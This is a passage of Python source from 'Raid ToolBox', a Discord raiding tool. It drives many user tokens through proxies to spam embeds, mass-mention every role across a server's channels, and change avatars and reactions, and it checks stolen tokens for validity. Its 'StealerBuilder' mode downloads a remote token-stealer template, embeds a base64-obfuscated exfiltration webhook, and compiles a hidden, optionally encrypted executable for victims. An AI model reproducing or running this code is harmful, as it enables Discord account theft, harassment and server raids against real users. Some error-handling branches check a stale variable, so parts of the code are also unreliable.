    window = sg.Window('RTB | Embed Spammer', layout, keep_on_top=True, icon=rtb_icon)
    event, values = window.Read()
    window.Close()
    if event == "Start":
        pass
    else:
        sys.exit()
    server = values["ServerID"]
    channel = values["ChannelID"]
    title = values["Title"]
    author = values["Author"]
    iconurl = values["IconURL"]
    field_name = values["FieldName"]
    field_value = values["FieldValue"]
    imgurl = values["ImageURL"]
    footer = values["FooterText"]
    for token in tokenlist:
        executor.submit(embedspam, token, channel, server, title, author, iconurl, field_name, field_value, imgurl, footer)

elif mode == 'avatarchange':
    def changeavatar(token, avatarfile):
        headers, proxies = setup_request(token)
        request = requests.Session()
        while True:
            try:
                src = request.get('https://'+endpoint+'discord.com/api/v8/users/@me', headers=headers, proxies=proxies, timeout=10)
            except Exception:
                if use_proxies == 1:
                    proxies = request_new_proxy()
                else:
                    break
            else:
                break
        if src.status_code == 429:
            error = json.loads(src.content)
            write_error(token, error['message'], error['code'])
            sys.exit()
        elif src.status_code == 401:
            error = json.loads(src.content)
            write_error(token, error['message'], error['code'])
            sys.exit()
        elif src.status_code == 404:
            error = json.loads(src.content)
            write_error(token, error['message'], error['code'])
            sys.exit()
        elif src.status_code == 403:
            error = json.loads(src.content)
            write_error(token, error['message'], error['code'])
            sys.exit()
        response = json.loads(src.content.decode())
        username = response['username']
        email = response['email']
        with open(avatarfile, "rb") as avatar_handle:
            encoded = bytes_to_base64_data(avatar_handle.read())
        payload = {
            'avatar': encoded,
            'email': email,
            'password': '',
            'username': username
        }
        while True:
            try:
                src = request.patch('https://'+endpoint+'discord.com/api/v8/users/@me', headers=headers, json=payload, proxies=proxies, timeout=20)
            except Exception:
                if use_proxies == 1:
                    proxies = request_new_proxy()
                else:
                    break
            else:
                break
        if src.status_code == 429:
            error = json.loads(src.content)
            write_error(token, error['message'], error['code'])
            sys.exit()
        elif src.status_code == 401:
            error = json.loads(src.content)
            write_error(token, error['message'], error['code'])
            sys.exit()
        elif src.status_code == 404:
            error = json.loads(src.content)
            write_error(token, error['message'], error['code'])
            sys.exit()
        elif src.status_code == 403:
            error = json.loads(src.content)
            write_error(token, error['message'], error['code'])
            sys.exit()

    layout = [
        [sg.Text('Single Avatar',size=(20,1), key="SingleText"), sg.Input(key="AvatarSingle"), sg.FileBrowse(button_color=theme['button_colour'], key="Filebrowse", file_types=(("PNG Files", "*.png"), ("JPG Files", "*.jpg"), ("JPEG Files", "*.jpeg"), ("GIF Files", "*.gif"), ("WEBM Files", "*.webm")))],
        [sg.Text('Random Avatars (Folder)',size=(20,1), key="RandomText"), sg.Input(key="AvatarRandom"), sg.FolderBrowse(button_color=theme['button_colour'], key="Folderbrowse")],
        [sg.Button('Start',button_color=theme['button_colour'],size=(10,1)), sg.Combo(['Single', 'Random'], key="Type", readonly=True)]
    ]
    window = sg.Window('RTB | Avatar Changer', layout, keep_on_top=True, icon=rtb_icon)
    while True:
        event, values = window.Read(timeout=100)
        if event == "Start":
            window.Close()
            break
        elif values["Type"] == "Single":
            window["AvatarRandom"].Update(disabled=True)
            window["Folderbrowse"].Update(disabled=True)
            window["AvatarSingle"].Update(disabled=False)
            window["Filebrowse"].Update(disabled=False)
        elif values["Type"] == "Random":
            window["AvatarRandom"].Update(disabled=False)
            window["Folderbrowse"].Update(disabled=False)
            window["AvatarSingle"].Update(disabled=True)
            window["Filebrowse"].Update(disabled=True)
        elif event is None:
            sys.exit()
    avatarfile = values["AvatarSingle"]
    avatarfolder = values["AvatarRandom"]
    if values["Type"] == "Single":
        for token in tokenlist:
            executor.submit(changeavatar, token, avatarfile)
    elif values["Type"] == "Random":
        files = os.listdir(avatarfolder)
        for token in tokenlist:
            avatarfile = avatarfolder + "/" + random.choice(files)
            executor.submit(changeavatar, token, avatarfile)

elif mode == "rolemention":
    def sendrolemention(token, channel, server):
        headers, proxies = setup_request(token)
        request = requests.Session()
        rolelist = []
        msg = ''
        while True:
            try:
                roles = request.get(f"https://{endpoint}discord.com/api/v8/guilds/{server}/roles",headers=headers, proxies=proxies, timeout=10)
            except Exception:
                if use_proxies == 1:
                    proxies = request_new_proxy()
                else:
                    break
            else:
                break
        if src.status_code == 401:
            error = json.loads(src.content)
            write_error(token, error['message'], error['code'])
            sys.exit()
        elif src.status_code == 404:
            error = json.loads(src.content)
            write_error(token, error['message'], error['code'])
            sys.exit()
        elif src.status_code == 403:
            error = json.loads(src.content)
            write_error(token, error['message'], error['code'])
            sys.exit()
        rolejson = json.loads(roles.content)
        for role in rolejson:
            rolelist.append("<@&{}>".format(role['id']))
        for role in rolelist:
            msg += role + ' '
        if channel == 'all':
            while True:
                try:
                    src = request.get(f"https://{endpoint}discord.com/api/v8/guilds/{server}/channels",headers=headers, proxies=proxies, timeout=10)
                except Exception:
                    if use_proxies == 1:
                        proxies = request_new_proxy()
                    else:
                        break
                else:
                    break
            if src.status_code == 401:
                error = json.loads(src.content)
                write_error(token, error['message'], error['code'])
                sys.exit()
            elif src.status_code == 404:
                error = json.loads(src.content)
                write_error(token, error['message'], error['code'])
                sys.exit()
            elif src.status_code == 403:
                error = json.loads(src.content)
                write_error(token, error['message'], error['code'])
                sys.exit()
            channellist = json.loads(src.content)
            while True:
                for channel in channellist:
                    if not channel['type'] == 0:
                        continue
                    else:
                        for m in [msg[i:i+1999] for i in range(0, len(msg), 1999)]:
                            payload = {"content" : m, "tts" : False}
                            while True:
                                try:
                                    src = request.post(f"https://{endpoint}discord.com/api/v8/channels/{channel['id']}/messages", headers=headers, json=payload, proxies=proxies, timeout=10)
                                except Exception:
                                    if use_proxies == 1:
                                        proxies = request_new_proxy()
                                    else:
                                        break
                                else:
                                    break
                            if src.status_code == 429:
                                ratelimit = json.loads(src.content)
                                time.sleep(float(ratelimit['retry_after']/1000))
                            elif src.status_code == 401:
                                error = json.loads(src.content)
                                write_error(token, error['message'], error['code'])
                                sys.exit()
                            elif src.status_code == 404:
                                error = json.loads(src.content)
                                write_error(token, error['message'], error['code'])
                                sys.exit()
                            elif src.status_code == 403:
                                error = json.loads(src.content)
                                write_error(token, error['message'], error['code'])
        else:
            while True:
                for m in [msg[i:i+1999] for i in range(0, len(msg), 1999)]:
                    payload = {"content": m, "tts": False}
                    while True:
                        try:
                            src = request.post(f"https://{endpoint}discord.com/api/v8/channels/{channel}/messages", headers=headers, json=payload, proxies=proxies, timeout=10)
                        except Exception:
                            if use_proxies == 1:
                                proxies = request_new_proxy()
                            else:
                                break
                        else:
                            break
                    if src.status_code == 429:
                        ratelimit = json.loads(src.content)
                        time.sleep(float(ratelimit['retry_after']/1000))
                    elif src.status_code == 401:
                        error = json.loads(src.content)
                        write_error(token, error['message'], error['code'])
                        sys.exit()
                    elif src.status_code == 404:
                        error = json.loads(src.content)
                        write_error(token, error['message'], error['code'])
                        sys.exit()
                    elif src.status_code == 403:
                        error = json.loads(src.content)
                        write_error(token, error['message'], error['code'])
    if command_line_mode == 0:
        layout = [
            [sg.Text('Server ID', size=(15, 1)), sg.Input(key="Server")],
            [sg.Text('Channel ID', size=(15, 1)), sg.Input('all', key="Channel")],
            [sg.Button('Start', button_color=theme['button_colour'], size=(10,1))]
        ]
        window = sg.Window('RTB | Role Mass Mentioner', layout, keep_on_top=True, icon=rtb_icon)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        SERVER = values["Server"]
        channelid = values["Channel"]
    else:
        SERVER = sys.argv[6]
        channelid = sys.argv[7]
    for token in tokenlist:
        executor.submit(sendrolemention, token, channelid, SERVER)

elif mode == "cleanup":
    if command_line_mode == 0:
        layout = [
            [sg.Text('Enter A Server ID to delete all the messages in all channels sent by the token.')],
            [sg.Input(key="Server")],
            [sg.Button('Start', button_color=theme['button_colour'], size=(10,1))]
        ]
        window = sg.Window('RTB | Server Cleanup', layout, keep_on_top=True, icon=rtb_icon)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        server = values["Server"]
    else:
        server = sys.argv[6]
    for token in tokenlist:
        subprocess.Popen([python_command, 'RTBFiles/cleanup.py', token, server, str(os.getpid()), 'None'])
    while True:
        pass

elif mode == "hypesquad":
    def changehouse(token, house):
        headers, proxies = setup_request(token)
        request = requests.Session()
        if house == "Bravery":
            payload = {'house_id': 1}
        elif house == "Brilliance":
            payload = {'house_id': 2}
        elif house == "Balance":
            payload = {'house_id': 3}
        elif house == "Random":
            houses = [1, 2, 3]
            payload = {'house_id': random.choice(houses)}
        while True:
            try:
                request.post('https://'+endpoint+'discord.com/api/v8/hypesquad/online', headers=headers, json=payload, proxies=proxies, timeout=10)
            except Exception:
                if use_proxies == 1:
                    proxies = request_new_proxy()
                else:
                    break
            else:
                break
        if src.status_code == 429:
            ratelimit = json.loads(src.content)
            time.sleep(float(ratelimit['retry_after']/1000))
        elif src.status_code == 401:
            error = json.loads(src.content)
            write_error(token, error['message'], error['code'])
            sys.exit()
        elif src.status_code == 404:
            error = json.loads(src.content)
            write_error(token, error['message'], error['code'])
            sys.exit()
        elif src.status_code == 403:
            error = json.loads(src.content)
            write_error(token, error['message'], error['code'])
            sys.exit()

    if command_line_mode == 0:
        layout = [
            [sg.Text('House To Change to', size=(15, 1)), sg.Combo(['Bravery', 'Brilliance', 'Balance', 'Random'], readonly=True, key="House")],
            [sg.Button('Start', button_color=theme['button_colour'],size=(10,1))]
        ]
        window = sg.Window('RTB | HypeSquad House Changer', layout, keep_on_top=True, icon=rtb_icon)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        house = values["House"]
    else:
        house = sys.argv[6]
    for token in tokenlist:
        executor.submit(changehouse, token, house)

elif mode == "reaction":
    import emoji
    def addreact(token, emoji, message, channel, type):
        headers, proxies = setup_request(token)
        request = requests.Session()
        if type == "Add":
            while True:
                try:
                    request.put(f"https://{endpoint}discord.com/api/v8/channels/{channel}/messages/{message}/reactions/{emoji}/@me", headers=headers, proxies=proxies, timeout=10)
                except Exception:
                    if use_proxies == 1:
                        proxies = request_new_proxy()
                    else:
                        break
                else:
                    break
        elif type == "Remove":
            while True:
                try:
                    request.delete(f"https://{endpoint}discord.com/api/v8/channels/{channel}/messages/{message}/reactions/{emoji}/@me", headers=headers, proxies=proxies, timeout=10)
                except Exception:
                    if use_proxies == 1:
                        proxies = request_new_proxy()
                    else:
                        break
                else:
                    break
    if command_line_mode == 0:
        emojilist = [
            ':smile:', ':laughing:', ':blush:', ':smiley:', ':relaxed:', ':smirk:', ':heart_eyes:', ':kissing_heart:', ':kissing_closed_eyes:',
            ':flushed:', ':relieved:', ':satisfied:', ':grin:', ':wink:', ':stuck_out_tongue_winking_eye:', ':stuck_out_tongue_closed_eyes:',
            ':grinning:', ':kissing:', ':kissing_smiling_eyes:', ':stuck_out_tongue:', ':sleeping:', ':worried:', ':frowning:', ':anguished:',
            ':open_mouth:', ':grimacing:', ':confused:', ':hushed:', ':expressionless:', ':unamused:', ':sweat_smile:', ':sweat:', ':disappointed_relieved:',
            ':weary:', ':pensive:', ':disappointed:', ':confounded:', ':fearful:', ':cold_sweat:', ':persevere:', ':cry:', ':sob:', ':joy:',
            ':astonished:', ':scream:', ':tired_face:', ':angry:', ':rage:', ':triumph:', ':sleepy:', ':yum:', ':mask:', ':sunglasses:',
            ':dizzy_face:', ':imp:', ':smiling_imp:', ':neutral_face:', ':no_mouth:', ':innocent:', ':alien:', ':yellow_heart:', ':blue_heart:',
            ':purple_heart:', ':heart:', ':green_heart:', ':broken_heart:', ':heartbeat:', ':heartpulse:', ':two_hearts:', ':revolving_hearts:',
            ':cupid:', ':sparkling_heart:', ':sparkles:', ':star:', ':star2:', ':dizzy:', ':boom:', ':anger:', ':exclamation:', ':question:',
            ':grey_exclamation:', ':grey_question:', ':zzz:', ':dash:', ':sweat_drops:', ':notes:', ':musical_note:', ':fire:', ':hankey:',
            ':poop:', ':shit:', ':+1:', ':thumbsup:', ':-1:', ':thumbsdown:', ':ok_hand:', ':punch:', ':fist:', ':v:', ':wave:', ':raised_hand:',
            ':open_hands:', ':point_up:', ':point_down:', ':point_left:', ':point_right:', ':raised_hands:', ':pray:', ':point_up_2:', ':clap:',
            ':muscle:', ':metal:', ':runner:', ':couple:', ':family:', ':two_men_holding_hands:', ':two_women_holding_hands:', ':dancer:',
            ':dancers:', ':ok_woman:', ':no_good:', ':information_desk_person:', ':raising_hand:', ':bride_with_veil:', ':person_with_pouting_face:',
            ':person_frowning:', ':bow:', ':couplekiss:', ':couple_with_heart:', ':massage:', ':haircut:', ':nail_care:', ':boy:', ':girl:',
            ':woman:', ':man:', ':baby:', ':older_woman:', ':older_man:', ':person_with_blond_hair:', ':man_with_gua_pi_mao:', ':man_with_turban:',
            ':construction_worker:', ':cop:', ':angel:', ':princess:', ':smiley_cat:', ':smile_cat:', ':heart_eyes_cat:', ':kissing_cat:',
            ':smirk_cat:', ':scream_cat:', ':crying_cat_face:', ':joy_cat:', ':pouting_cat:', ':japanese_ogre:', ':japanese_goblin:', ':see_no_evil:',
            ':hear_no_evil:', ':speak_no_evil:', ':guardsman:', ':skull:', ':feet:', ':lips:', ':kiss:', ':droplet:', ':ear:', ':eyes:', ':nose:',
            ':tongue:', ':love_letter:', ':bust_in_silhouette:', ':busts_in_silhouette:', ':speech_balloon:', ':thought_balloon:', ':sunny:',
            ':umbrella:', ':cloud:', ':snowflake:', ':snowman:', ':zap:', ':cyclone:', ':foggy:', ':ocean:', ':cat:', ':dog:', ':mouse:',
            ':hamster:', ':rabbit:', ':wolf:', ':frog:', ':tiger:', ':koala:', ':bear:', ':pig:', ':pig_nose:', ':cow:', ':boar:', ':monkey_face:',
            ':monkey:', ':horse:', ':racehorse:', ':camel:', ':sheep:', ':elephant:', ':panda_face:', ':snake:', ':bird:', ':baby_chick:',
            ':hatched_chick:', ':hatching_chick:', ':chicken:', ':penguin:', ':turtle:', ':bug:', ':ant:', ':beetle:', ':snail:', ':octopus:',
            ':tropical_fish:', ':fish:', ':whale:', ':whale2:', ':dolphin:', ':cow2:', ':ram:', ':rat:', ':water_buffalo:', ':tiger2:',
            ':rabbit2:', ':dragon:', ':goat:', ':rooster:', ':dog2:', ':pig2:', ':mouse2:', ':ox:', ':dragon_face:', ':blowfish:', ':crocodile:',
            ':dromedary_camel:', ':leopard:', ':cat2:', ':poodle:', ':paw_prints:', ':bouquet:', ':cherry_blossom:', ':tulip:',
            ':four_leaf_clover:', ':rose:', ':sunflower:', ':hibiscus:', ':maple_leaf:', ':leaves:', ':fallen_leaf:', ':herb:', ':mushroom:',
            ':cactus:', ':palm_tree:', ':evergreen_tree:', ':deciduous_tree:', ':chestnut:', ':seedling:', ':blossom:', ':ear_of_rice:',
            ':shell:', ':globe_with_meridians:', ':sun_with_face:', ':full_moon_with_face:', ':new_moon_with_face:', ':new_moon:',
            ':waxing_crescent_moon:', ':first_quarter_moon:', ':waxing_gibbous_moon:', ':full_moon:', ':waning_gibbous_moon:',
            ':last_quarter_moon:', ':waning_crescent_moon:', ':last_quarter_moon_with_face:', ':first_quarter_moon_with_face:',
            ':crescent_moon:', ':earth_africa:', ':earth_americas:', ':earth_asia:', ':volcano:', ':milky_way:', ':partly_sunny:',
            ':bamboo:', ':gift_heart:', ':dolls:', ':school_satchel:', ':mortar_board:', ':flags:', ':fireworks:', ':sparkler:',
            ':wind_chime:', ':rice_scene:', ':jack_o_lantern:', ':ghost:', ':santa:', ':christmas_tree:', ':gift:', ':bell:', ':no_bell:',
            ':tanabata_tree:', ':tada:', ':confetti_ball:', ':balloon:', ':crystal_ball:', ':cd:', ':dvd:', ':floppy_disk:', ':camera:',
            ':video_camera:', ':movie_camera:', ':computer:', ':tv:', ':iphone:', ':telephone:', ':telephone_receiver:', ':pager:',
            ':fax:', ':minidisc:', ':vhs:', ':sound:', ':speaker:', ':mute:', ':loudspeaker:', ':mega:', ':hourglass:', ':hourglass_flowing_sand:',
            ':alarm_clock:', ':watch:', ':radio:', ':satellite:', ':loop:', ':mag:', ':mag_right:', ':unlock:', ':lock:', ':lock_with_ink_pen:',
            ':closed_lock_with_key:', ':key:', ':bulb:', ':flashlight:', ':high_brightness:', ':low_brightness:', ':electric_plug:', ':battery:',
            ':calling:', ':email:', ':mailbox:', ':postbox:', ':bath:', ':bathtub:', ':shower:', ':toilet:', ':wrench:', ':nut_and_bolt:',
            ':hammer:', ':seat:', ':moneybag:', ':yen:', ':dollar:', ':pound:', ':euro:',  ':credit_card:', ':money_with_wings:', ':inbox_tray:',
            ':outbox_tray:', ':envelope:', ':incoming_envelope:', ':postal_horn:', ':mailbox_closed:', ':mailbox_with_mail:', ':mailbox_with_no_mail:',
            ':package:', ':door:', ':smoking:', ':bomb:', ':gun:', ':pill:', ':syringe:', ':page_facing_up:', ':page_with_curl:', ':bookmark_tabs:',
            ':bar_chart:', ':chart_with_upwards_trend:', ':chart_with_downwards_trend:', ':scroll:', ':clipboard:', ':calendar:', ':date:',
            ':card_index:',  ':file_folder:', ':open_file_folder:', ':scissors:', ':pushpin:', ':paperclip:', ':black_nib:', ':pencil2:',
            ':straight_ruler:', ':triangular_ruler:', ':closed_book:', ':green_book:', ':blue_book:', ':orange_book:', ':notebook:',
            ':notebook_with_decorative_cover:', ':ledger:', ':books:', ':bookmark:', ':name_badge:', ':microscope:', ':telescope:', ':newspaper:',
            ':football:', ':basketball:', ':soccer:', ':baseball:', ':tennis:', ':8ball:', ':rugby_football:', ':bowling:',  ':golf:',
            ':mountain_bicyclist:', ':bicyclist:', ':horse_racing:', ':snowboarder:', ':swimmer:', ':surfer:', ':ski:', ':spades:',
            ':hearts:', ':clubs:', ':diamonds:', ':gem:', ':ring:', ':trophy:', ':musical_score:', ':musical_keyboard:', ':violin:',
            ':space_invader:', ':video_game:', ':black_joker:', ':flower_playing_cards:', ':game_die:', ':dart:', ':mahjong:', ':clapper:',
            ':pencil:', ':book:', ':art:', ':microphone:', ':headphones:', ':trumpet:', ':saxophone:',  ':guitar:', ':sandal:', ':high_heel:',
            ':lipstick:', ':boot:', ':shirt:', ':necktie:', ':womans_clothes:', ':dress:', ':running_shirt_with_sash:', ':jeans:', ':kimono:',
            ':bikini:', ':ribbon:', ':tophat:', ':crown:', ':womans_hat:', ':mans_shoe:', ':closed_umbrella:', ':briefcase:', ':handbag:',
            ':pouch:', ':purse:', ':eyeglasses:', ':fishing_pole_and_fish:', ':coffee:', ':tea:', ':sake:', ':baby_bottle:', ':beer:',
            ':beers:', ':cocktail:', ':tropical_drink:',  ':wine_glass:', ':fork_and_knife:', ':pizza:', ':hamburger:', ':fries:',
            ':poultry_leg:', ':meat_on_bone:', ':spaghetti:', ':curry:', ':fried_shrimp:', ':bento:', ':sushi:', ':fish_cake:', ':rice_ball:',
            ':rice_cracker:', ':rice:', ':ramen:', ':stew:', ':oden:', ':dango:', ':egg:', ':bread:', ':doughnut:', ':custard:', ':icecream:',
            ':ice_cream:', ':shaved_ice:', ':birthday:', ':cake:', ':cookie:', ':chocolate_bar:', ':candy:', ':lollipop:', ':honey_pot:',
            ':apple:',  ':green_apple:', ':tangerine:', ':lemon:', ':cherries:', ':grapes:', ':watermelon:', ':strawberry:', ':peach:', ':melon:',
            ':banana:', ':pear:', ':pineapple:', ':sweet_potato:', ':eggplant:', ':tomato:', ':corn:', ':house:', ':house_with_garden:', ':school:',
            ':office:', ':post_office:', ':hospital:', ':bank:', ':convenience_store:', ':love_hotel:', ':hotel:', ':wedding:', ':church:', ':department_store:',
            ':european_post_office:', ':city_sunrise:', ':city_sunset:',  ':japanese_castle:', ':european_castle:', ':tent:', ':factory:',
            ':tokyo_tower:', ':japan:', ':mount_fuji:', ':sunrise_over_mountains:', ':sunrise:', ':stars:', ':statue_of_liberty:', ':bridge_at_night:',
            ':carousel_horse:', ':rainbow:', ':ferris_wheel:', ':fountain:', ':roller_coaster:', ':ship:', ':speedboat:', ':sailboat:',
            ':rowboat:', ':anchor:', ':rocket:', ':airplane:', ':helicopter:', ':steam_locomotive:', ':tram:', ':mountain_railway:', ':bike:',
            ':aerial_tramway:',  ':suspension_railway:', ':mountain_cableway:', ':tractor:', ':blue_car:', ':oncoming_automobile:', ':car:',
            ':red_car:', ':taxi:', ':oncoming_taxi:', ':articulated_lorry:', ':bus:', ':oncoming_bus:', ':rotating_light:', ':police_car:',
            ':oncoming_police_car:', ':fire_engine:', ':ambulance:', ':minibus:', ':truck:', ':train:', ':station:', ':train2:', ':bullettrain_front:',
            ':bullettrain_side:', ':light_rail:', ':monorail:', ':railway_car:', ':trolleybus:', ':ticket:',  ':fuelpump:', ':vertical_traffic_light:',
            ':traffic_light:', ':warning:', ':construction:', ':beginner:', ':atm:', ':slot_machine:', ':busstop:', ':barber:', ':hotsprings:',
            ':checkered_flag:', ':crossed_flags:', ':izakaya_lantern:', ':moyai:', ':circus_tent:', ':performing_arts:', ':round_pushpin:',
            ':triangular_flag_on_post:', ':flag_jp:', ':flag_kr:', ':flag_cn:', ':flag_us:', ':flag_fr:', ':flag_es:', ':flag_it:', ':flag_ru:',
            ':flag_gb:', ':flag_de:', ':flag_ng:',  ':cinema:', ':koko:', ':signal_strength:', ':u5272:', ':u5408:', ':u55b6:', ':u6307:',
            ':u6708:', ':u6709:', ':u6e80:', ':u7121:', ':u7533:', ':u7a7a:', ':u7981:', ':sa:', ':restroom:', ':mens:', ':womens:', ':baby_symbol:',
            ':no_smoking:', ':parking:', ':wheelchair:', ':metro:', ':baggage_claim:', ':accept:', ':wc:', ':potable_water:', ':put_litter_in_its_place:',
            ':secret:', ':congratulations:', ':m:', ':passport_control:', ':left_luggage:', ':customs:',  ':ideograph_advantage:', ':cl:', ':sos:',
            ':id:', ':no_entry_sign:', ':underage:', ':no_mobile_phones:', ':do_not_litter:', ':non-potable_water:', ':no_bicycles:', ':no_pedestrians:',
            ':children_crossing:', ':no_entry:', ':eight_spoked_asterisk:', ':sparkle:', ':eight_pointed_black_star:', ':heart_decoration:', ':vs:',
            ':vibration_mode:', ':mobile_phone_off:', ':chart:', ':currency_exchange:', ':aries:', ':taurus:', ':gemini:', ':cancer:', ':leo:',
            ':virgo:', ':libra:',  ':scorpius:', ':sagittarius:', ':capricorn:', ':aquarius:', ':pisces:', ':ophiuchus:', ':six_pointed_star:',
            ':negative_squared_cross_mark:', ':a:', ':b:', ':ab:', ':o2:', ':diamond_shape_with_a_dot_inside:', ':recycle:', ':end:', ':back:',
            ':on:', ':soon:', ':clock1:', ':clock130:', ':clock10:', ':clock1030:', ':clock11:', ':clock1130:', ':clock12:', ':clock1230:',
            ':clock2:', ':clock230:', ':clock3:', ':clock330:', ':clock4:', ':clock430:', ':clock5:', ':clock530:',  ':clock6:', ':clock630:',
            ':clock7:', ':clock730:', ':clock8:', ':clock830:', ':clock9:', ':clock930:', ':heavy_dollar_sign:', ':copyright:', ':registered:',
            ':tm:', ':x:', ':bangbang:', ':interrobang:', ':o:', ':heavy_multiplication_x:', ':heavy_plus_sign:', ':heavy_minus_sign:',
            ':heavy_division_sign:', ':white_flower:', ':100:', ':heavy_check_mark:', ':ballot_box_with_check:', ':radio_button:', ':link:',
            ':curly_loop:', ':wavy_dash:', ':part_alternation_mark:',  ':trident:', ':black_small_square:', ':white_small_square:', ':black_medium_small_square:',
            ':white_medium_small_square:', ':black_medium_square:', ':white_medium_square:', ':black_large_square:', ':white_large_square:', ':white_check_mark:',
            ':black_square_button:', ':white_square_button:', ':black_circle:', ':white_circle:', ':red_circle:', ':large_blue_circle:', ':large_blue_diamond:',
            ':large_orange_diamond:', ':small_blue_diamond:', ':small_orange_diamond:',  ':small_red_triangle:', ':small_red_triangle_down:'
        ]
        layout = [
            [sg.Text('Channel ID', size=(15, 1)), sg.Input(key="Channel")],
            [sg.Text('Message ID', size=(15, 1)), sg.Input(key="Message")],
            [sg.Combo(['Add','Remove'], readonly=True,size=(14,1), key="Method"), sg.Combo(emojilist, size=(10,1), key="Emoji", default_value=":smile:")],
            [sg.Button('Start', button_color=theme['button_colour'], size=(10,1))]
        ]
        window = sg.Window('RTB | Message Reactor', layout, keep_on_top=True, icon=rtb_icon)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        channel = values["Channel"]
        message = values["Message"]
        type = values["Method"]
        emoji = emoji.emojize(values["Emoji"].rstrip(), use_aliases=True)
    else:
        message = sys.argv[6]
        channel = sys.argv[7]
        type = sys.argv[8]
        emoji = emoji.emojize(sys.argv[8].rstrip(), use_aliases=True)
    for token in tokenlist:
        executor.submit(addreact, token, emoji, message, channel, type)

elif mode == 'quickcheck': # Legacy Shit
    from colorama import init
    from termcolor import colored
    init()
    token = sys.argv[6]
    apilink = 'https://'+endpoint+'discord.com/api/v8/users/@me'
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    src = requests.get(apilink, headers=headers)
    if "401: Unauthorized" in str(src.content):
        print(colored(token + " Invalid","red"))
    else:
        response = json.loads(src.content.decode())
        if response["verified"]:
            print(colored(token + " Valid","green"))
            with open ("quick_checked_tokens_verified.txt", "a+") as handle:
                handle.write(token+"\n")
        else:
            print(colored(token + " Unverified","yellow"))
            with open ("quick_checked_tokens_unverified.txt", "a+") as handle:
                handle.write(token+"\n")

elif mode == "StealerBuilder":
    import PyInstaller.__main__
    request = requests.Session()
    if sys.platform.startswith("linux"):
        sg.Popup("Linux isn't supported yet.")
        sys.exit()
    if not os.path.exists("RTBStealerBuilder/"):
        os.mkdir("RTBStealerBuilder/")
    def build():
        global name
        global webhook
        global useicon
        global encrypt
        global icon
        global Window
        global runonce
        global killdisc
        try:
            os.chdir('RTBStealerBuilder/')
            pyname = name+'.py'
            if sys.platform.startswith("win32"):
                temp = request.get("https://gist.githubusercontent.com/DeadBread76/33bebc13ac454b76961cb7797c941a92/raw/f4bef215dfdece01d0d049afe5aa5680c24a9f19/stealertemplate.py").text
            elif sys.platform.startswith("darwin"):
                temp = request.get("https://gist.githubusercontent.com/DeadBread76/33bebc13ac454b76961cb7797c941a92/raw/f4bef215dfdece01d0d049afe5aa5680c24a9f19/stealertemplatemac.py").text
            with open("template.py", "w+") as handle:
                handle.write(temp)
            with open("template.py") as f:
                lines = f.readlines()
            os.remove("template.py")
            with open(pyname, "w") as f:
                list_string = [runonce, killdisc, base64.b64encode(str(cycles).encode()).decode(), webhook.decode(), str(uuid.uuid4())]
                if sys.platform.startswith("win32"):
                    lines.insert(11, f"a = {str(list_string)}")
                elif sys.platform.startswith("darwin"):
                    lines.insert(14, f"a = {str(list_string)}")
                f.write("".join(lines))
            print("Building EXE, Please wait...")
            arg = [
                '--onefile',
                '--noconsole',
                '--distpath=Executable',
            ]
            if useicon:
                arg.append(f'--icon={icon}')
            if encrypt:
                arg.append(f'--key={str(uuid.uuid4())}')
            arg.append(pyname)
            PyInstaller.__main__.run(arg)
            print("EXE built, Cleaning up...")
            os.chdir("..")
            shutil.rmtree('build')
            os.remove(f'{name}.spec')
            print("Finished!")
        except Exception as e:
            print(e)
        window['Build'].Update(disabled=False)


    layout = [
        [sg.Text('Output Name', size=(10, 1)), sg.Input(size=(10, 1), key="namea")],
        [sg.Text('Webhook', size=(10, 1)), sg.Input(size=(50, 1), key="Webhook"), sg.Button('Test', size=(6,1))],
        [sg.Text('Icon', size=(10, 1)), sg.InputText(size=(50, 1), key="iconpath"), sg.FileBrowse(button_color=theme['button_colour'], file_types=(("Icon Files", "*.ico"),("All Files", "*.*")), size=(6,1), key="IconBrowse")],
        [sg.Text('Run Once Per PC', size=(13, 1)), sg.Checkbox('', default=True, key="Run", tooltip="Only Run once per PC to prevent spam."), sg.Text('Close Discord', size=(10, 1)), sg.Checkbox('', default=False, key="Close", tooltip="Close Discord on Run. (NOT STEALTHY)"), sg.Text('Base64 Cycles', size=(10, 1)), sg.Spin([i for i in range(0,50)], initial_value=1, key="Cycles", tooltip="More Cycles = Bigger and slower file"),  sg.Checkbox('Use Icon', key="Useicon"), sg.Checkbox('Encrypt', key="Encrypt", tooltip="Encrypt the Python ByteCode (PyCrypto needed; pip install pycryptodome, but beware: it will make the compiled exe 40+ MB)")],
        [sg.Output(size=(80, 15))],
        [sg.Button('Build', size=(35, 1), button_color=theme['button_colour']), sg.Exit(size=(35, 1), button_color=theme['button_colour'])]
    ]
    window = sg.Window("RTB | DeadBread's Token Stealer Builder v 0.3.0", layout, icon=rtb_icon)
    while True:
        event, values = window.Read(timeout=10)
        if event is None or event == 'Exit':
            break
        elif event == sg.TIMEOUT_KEY:
            if not values['Useicon']:
                window['iconpath'].Update(disabled=True)
                window['IconBrowse'].Update(disabled=True)
            else:
                window['iconpath'].Update(disabled=False)
                window['IconBrowse'].Update(disabled=False)
            if not sys.platform.startswith("win32"):
                window['Close'].Update(disabled=True)
            window.Refresh()
        elif event == "Test":
            payload = {
            "username": "Raid ToolBox",
            "avatar_url": 'https://i.imgur.com/TioPl63.png',
            "content": "Test, Sent From Raid ToolBox"
            }
            try:
                src = request.post(values["Webhook"], json=payload).text
                if src == "":
                    pass
                else:
                    j = ast.literal_eval(src)
                    try:
                        j['message']
                    except Exception:
                        pass
                    else:
                        print(j['message'])
                        raise Exception
            except Exception as e:
                print("Error Sending Payload")
            else:
                print("Sent Payload!")
        elif event == "Build":
            if values["namea"] == '':
                sg.PopupNonBlocking('Invalid Name!')
                continue
            if values["Webhook"] == '':
                sg.PopupNonBlocking('No webhook entered!')
                continue
            name = values["namea"]
            cycles = int(values["Cycles"])
            webhook = values["Webhook"].encode()
            useicon = values["Useicon"]
            icon = values["iconpath"]
            runonce = values['Run']
            killdisc = values['Close']
            encrypt = values['Encrypt']
            for x in range(cycles):
                webhook = base64.b64encode(webhook)
            t = threading.Thread(target=build)
            t.start()
            window['Build'].Update(disabled=True)
    window.Close()

elif mode == "InfoToken":
    headers, proxies = setup_request(sys.argv[6])
